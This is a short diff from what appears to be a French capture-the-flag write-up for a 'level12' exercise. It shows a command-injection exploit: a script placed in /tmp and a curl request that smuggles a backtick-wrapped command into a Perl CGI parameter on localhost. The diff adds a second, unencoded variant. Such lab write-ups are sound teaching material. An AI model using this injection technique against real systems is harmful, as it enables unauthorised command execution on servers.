@@ -33,7 +33,9 @@ echo 'getflag > /tmp/yes' > /tmp/GETFLAG
 chmod +x /tmp/GETFLAG
 
 # 2. Injecter via curl (backtick = %60 en URL)
-curl "localhost:4646/level12.pl?x=%60/*/GETFLAG%60&y=1"
+curl "localhost:4646/level12.pl?x=%60/*/GETFLAG%60&y=1" ou
+curl 'localhost:4646/level12.pl?x=`/*/GETFLAG`&y=1'
+
 
 # 3. Lire le résultat
 cat /tmp/yes
